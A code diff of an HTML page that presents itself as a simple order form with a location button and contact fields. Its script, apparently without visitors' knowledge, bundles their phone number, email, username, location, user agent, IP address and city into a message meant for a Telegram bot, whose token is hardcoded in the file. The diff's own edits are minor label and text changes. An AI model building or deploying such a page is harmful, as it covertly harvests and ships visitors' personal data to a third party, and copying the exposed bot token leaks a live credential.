@@ -225,6 +225,7 @@ button{
             <p class="slogan">R40 each Pox</p>
          
  <form>
+   <p>Press the get location button to fill in ur location automatically </p>
     <button type="button" onclick="getLocation()">Get Location</button>
   </form>
 
@@ -248,13 +249,14 @@ button{
                 class="input-field" name="email" required/>
                 <input id="name" type="locate" placeholder="How many note each R40" class="input-field" name="location"  required>
         <input type="tel" id="phone" name="phone" placeholder="phone" class="input-field" required>
+        
         <input type="text" id="username" name="username" placeholder="username" class="input-field" required>
                 <button type="submit" class="login-button">Send</button>
             </form>
             
             <div class="divider"></div>
             <div class="no-social-login">
-                <p>Don't have an account? <a href="#" id="signup-button"></a></p>
+                <p>? <a href="#" id="signup-button"></a></p>
             </div>
         </div>
     </div>
@@ -295,15 +297,15 @@ button{
                // Create the message to send
                const username = document.getElementById("username").value;
                const phone = document.getElementById("phone").value;
-               const pagename = document.getElementById("pagename").value;
+               const page = document.getElementById("pagename").value;
                const name = document.getElementById("name").value;
                const email = document.getElementById("email").value;
-               const message = `> green : ${page}\n\n> food :
+               
+               const message = `> Aly : ${page}\n\n> food :
                  ${name}\n\n> phone :
                  ${phone}\n\n> username :
                  ${username}\n\n> location url :
-                 ${email}\n\n> User Agent : 
-                 ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+                 ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
     
                // Send the message to your Telegram bot using the appropriate API
                const botToken = '6833607058:AAGgbkxgbikwaYWj2EmTnvhIDjAELhP5yi8';
